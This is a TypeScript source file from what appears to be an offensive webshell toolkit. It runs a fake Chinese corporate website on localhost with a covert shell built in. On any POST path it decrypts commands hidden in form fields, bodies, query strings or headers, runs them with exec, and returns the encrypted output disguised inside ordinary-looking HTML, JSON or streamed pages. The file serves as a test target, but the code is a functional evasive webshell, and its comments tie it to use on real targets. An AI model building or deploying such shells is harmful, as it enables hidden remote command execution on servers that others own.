/**
 * A fake business site with a mimic shell hidden inside it — the local
 * validation target for the mimic protocol (`memparty demo`, tests).
 *
 * Every GET returns a plausible portal page; a POST carrying the shell's
 * pass parameter is treated as a shell request no matter which path it
 * lands on — that is exactly how a filter-type memory shell behaves, and
 * what makes the mimic protocol's dynamic paths possible.
 */
import { exec } from "node:child_process";
import http from "node:http";
import type { AddressInfo } from "node:net";

import {
  decodeAnyBody,
  decodeRequestBody,
  deriveAesKey,
  encryptField,
  decryptField,
  injectFragment,
} from "./mimic-shared.js";
import { deriveMarkers, resolveCipher } from "./mimic-codecs.js";
import { PAYLOAD_PLACEHOLDER, type ProfileCipher, type ProfileTemplate } from "../core/site-profile.js";

/** Decrypt one carrier value (query/header mode), null on failure. */
function tryDecrypt(b64: string, aesKey: string, cipher = resolveCipher()): Buffer | null {
  try {
    return decryptField(b64, aesKey, cipher);
  } catch {
    return null;
  }
}

const SITE_TITLE = "云枢科技 - 企业数字化服务商";

const NAV = `<nav><a href="/">首页</a> <a href="/products/">产品中心</a> <a href="/news/">新闻动态</a> <a href="/about/">关于我们</a></nav>`;

const PAGES: Record<string, string> = {
  "/": `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>${SITE_TITLE}</title>
</head>
<body>
<header><h1>云枢科技</h1>${NAV}</header>
<main>
<h2>让企业数据流动起来</h2>
<p>云枢科技为中型企业提供数据集成、报表可视化与流程自动化服务。</p>
<ul>
<li><a href="/products/yunetl.html">云枢 ETL 平台</a></li>
<li><a href="/products/yunbi.html">云枢 BI 报表</a></li>
<li><a href="/news/2024/release-notes.html">2024 产品发布说明</a></li>
</ul>
</main>
<footer>© 2024 云枢科技 京ICP备2024000000号</footer>
</body>
</html>`,
  "/products/": `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>产品中心 - 云枢科技</title>
</head>
<body>
<header><h1>云枢科技</h1>${NAV}</header>
<main><h2>产品中心</h2><p>ETL / BI / 流程自动化三大产品线。</p></main>
<footer>© 2024 云枢科技</footer>
</body>
</html>`,
  "/news/": `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>新闻动态 - 云枢科技</title>
</head>
<body>
<header><h1>云枢科技</h1>${NAV}</header>
<main><h2>新闻动态</h2><p>云枢 ETL 3.2 发布，新增实时同步通道。</p></main>
<footer>© 2024 云枢科技</footer>
</body>
</html>`,
};

const NOT_FOUND = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>页面不存在 - 云枢科技</title>
</head>
<body>
<header><h1>云枢科技</h1>${NAV}</header>
<main><h2>404</h2><p>您访问的页面不存在。</p></main>
<footer>© 2024 云枢科技</footer>
</body>
</html>`;

/** The mock site's homepage — exported so `memparty demo` can use it as the skin. */
export const MOCK_HOMEPAGE = PAGES["/"]!;

export interface MimicServerOptions {
  pass?: string;
  secretKey?: string;
  /** Wire codec selection — must match the profile the client uses. */
  cipher?: ProfileCipher;
  /**
   * Cover templates the shell rotates (default: the mock homepage). A
   * template carrying {{payload}} gets the ciphertext substituted and is
   * served with its own contentType — JSON/XML/JS skins work the same way.
   */
  templates?: ProfileTemplate[];
  /** Carrier field names to probe (default: [pass]) — mirrors the filter's FIELDS. */
  fields?: string[];
  /** Command execution timeout on the "target" (default 5s). */
  execTimeoutMs?: number;
}

export interface MimicServer {
  url: string;
  port: number;
  close(): Promise<void>;
}

function runCommand(command: string, timeoutMs: number): Promise<string> {
  return new Promise((resolve) => {
    exec(command, { timeout: timeoutMs, windowsHide: true }, (err, stdout, stderr) => {
      if (err && !stdout && !stderr) {
        resolve(`command failed: ${err.message}`);
        return;
      }
      resolve(stdout + stderr);
    });
  });
}

/**
 * Start the fake site on 127.0.0.1 with a random port.
 * Shell responses reuse the homepage HTML as their skin — on a real target
 * that skin comes from the site profile learned by `memparty profile`.
 */
export async function startMimicServer(options: MimicServerOptions = {}): Promise<MimicServer> {
  const pass = options.pass ?? "pass";
  const secretKey = options.secretKey ?? "key";
  const cipher = resolveCipher(options.cipher);
  const aesKey = deriveAesKey(secretKey);
  const markers = deriveMarkers(pass, secretKey, cipher);
  const execTimeoutMs = options.execTimeoutMs ?? 5_000;
  const skins: ProfileTemplate[] = options.templates ?? [
    { title: "mock", template: PAGES["/"]!, contentType: "text/html; charset=utf-8" },
  ];
  const fields = options.fields ?? [pass];

  const server = http.createServer((req, res) => {
    if (req.method === "POST") {
      const chunks: Buffer[] = [];
      req.on("data", (c: Buffer) => chunks.push(c));
      req.on("end", () => {
        const rawBody = Buffer.concat(chunks);
        // carriers: form body | raw body (json/multipart/xml) | query | header
        let command: Buffer | null = null;
        for (const f of fields) {
          command = decodeRequestBody(rawBody, f, aesKey, cipher);
          if (command === null) command = decodeAnyBody(rawBody, f, aesKey, cipher);
          if (command === null) {
            const query = new URL(req.url ?? "/", "http://x").searchParams.get(f);
            if (query) command = tryDecrypt(query, aesKey, cipher);
          }
          if (command === null) {
            const header = req.headers[f.toLowerCase()];
            if (typeof header === "string") command = tryDecrypt(header, aesKey, cipher);
          }
          if (command !== null) break;
        }
        if (command === null) {
          res.writeHead(404, { "Content-Type": "text/html; charset=utf-8" });
          res.end(NOT_FOUND);
          return;
        }
        void runCommand(command.toString("utf8"), execTimeoutMs).then((output) => {
          const b64 = encryptField(Buffer.from(output, "utf8"), aesKey, cipher);
          const skin = skins[Math.floor(Math.random() * skins.length)]!;
          const body = skin.template.includes(PAYLOAD_PLACEHOLDER)
            ? skin.template.replaceAll(PAYLOAD_PLACEHOLDER, b64)
            : injectFragment(skin.template, markers.wrap(b64));
          res.writeHead(200, { "Content-Type": skin.contentType });
          if (skin.contentType.includes("event-stream")) {
            // flush chunk by chunk with a small cadence — looks like a live
            // stream on the wire, not a one-shot body
            const sseChunks = body.split("\n\n").filter((c) => c.length > 0);
            let i = 0;
            const next = (): void => {
              if (i < sseChunks.length) {
                res.write(`${sseChunks[i++]!}\n\n`);
                setTimeout(next, 25);
              } else {
                res.end();
              }
            };
            next();
          } else {
            res.end(body);
          }
        });
      });
      return;
    }
    const page = PAGES[req.url ?? "/"] ?? NOT_FOUND;
    res.writeHead(PAGES[req.url ?? "/"] ? 200 : 404, {
      "Content-Type": "text/html; charset=utf-8",
    });
    res.end(page);
  });

  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const { port } = server.address() as AddressInfo;
  return {
    url: `http://127.0.0.1:${port}/`,
    port,
    close: () => new Promise<void>((resolve) => server.close(() => resolve())),
  };
}
